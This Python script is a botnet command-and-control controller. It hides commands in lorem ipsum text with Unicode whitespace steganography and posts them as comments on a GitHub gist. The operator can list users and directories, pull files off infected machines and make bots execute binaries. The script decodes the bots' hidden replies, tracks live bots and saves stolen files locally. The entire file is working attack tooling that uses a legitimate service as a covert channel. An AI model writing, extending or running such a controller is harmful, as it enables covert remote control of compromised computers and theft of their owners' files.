import threading
import time
from github import Github
import pyUnicodeSteganography as usteg
import lorem

print(f"Hello, welcome to the bot controller. Possible commands are:\n\
    onl - get the number of online bots\n \
    w - get listing of currently logged users\n \
    ls <path> - get a listing of a paritcular directory\n \
    id - get id of current user\n \
    cp <full_path_to_the_file> - copy a file from bot to the controller\n \
    ex <full_path_to_the_binary>\n\n")

g = Github("") # INSERT YOUR TOKEN HERE
gist = g.get_gist('16f8ed1319b10a550451060d5a56d493')
no_comments = gist.comments
no_of_online_bots = 0
list_of_online_bots = {}

def send_command(args):
    if args[0] == "w":
        command = "CONTROL w"
        command_enc = usteg.encode(lorem.sentence(), command, method='snow')
        gist.create_comment(command_enc)
    elif args[0] == "ls" and len(args) > 1:
        command = "CONTROL ls " + args[1]
        command_enc = usteg.encode(lorem.sentence(), command, method='snow')
        gist.create_comment(command_enc)
    elif args[0] == "id":
        command = "CONTROL id"
        command_enc = usteg.encode(lorem.sentence(), command, method='snow')
        gist.create_comment(command_enc)
    elif args[0] == "cp" and len(args) > 1:
        command = "CONTROL cp " + args[1]
        command_enc = usteg.encode(lorem.sentence(), command, method='snow')
        gist.create_comment(command_enc)
    elif args[0] == "ex" and len(args) > 1:
        command = "CONTROL ex " + args[1]
        command_enc = usteg.encode(lorem.sentence(), command, method='snow')
        gist.create_comment(command_enc)
    elif args[0] == "onl":
        print("Number of Bots online:", no_of_online_bots)
    else:
        print("Sorry unknown command or incorrect number of arguments")


def process_response(r):
    global no_of_online_bots
    data = r.body
    response_metadata = None
    try:
        response_metadata = usteg.decode(data).split()
    except:
        response_metadata = []

    if len(response_metadata) < 1:
        return

    if response_metadata[0] != "BOT":
        return

    if response_metadata[1] == "TEXT":
        try:
            dec = usteg.decode(data, method='snow')
            print(dec)
        except:
            pass
    elif response_metadata[1] == "PING":
        botname = response_metadata[2].strip()
        if botname not in list_of_online_bots:
            no_of_online_bots += 1
        list_of_online_bots[botname] = 5
        print("\nPING from", botname)
    elif response_metadata[1] == "DATA":
        filename = response_metadata[2]
        filename = filename.split('/')[-1]
        decoded_binary = usteg.decode(data, method='snow', binary=True)
        with open(filename, 'wb') as f:
            f.write(decoded_binary)
        print("\nFILE", filename, "was saved")


def get_responses():
    global no_comments
    global no_of_online_bots
    gist = g.get_gist('16f8ed1319b10a550451060d5a56d493')
    no_msgs_to_process = gist.comments - no_comments
    no_comments = gist.comments

    for k in list_of_online_bots:
        list_of_online_bots[k] -= 1

    i = 0
    for c in gist.get_comments().reversed:
        if i == no_msgs_to_process:
            break
        process_response(c)
        i += 1

    # removing dead bots
    toDelete = []
    for k in list_of_online_bots:
        if int(list_of_online_bots[k]) <= 0:
            print("\nBot", k, "is dead")
            no_of_online_bots -= 1
            toDelete.append(k)
    for k in toDelete:
        list_of_online_bots.pop(k)

    threading.Timer(3, get_responses).start()


get_responses()

while True:
    command = input("Enter command: ")
    if len(command) > 0:
        send_command(command.split())
    else:
        print("No command supplied")
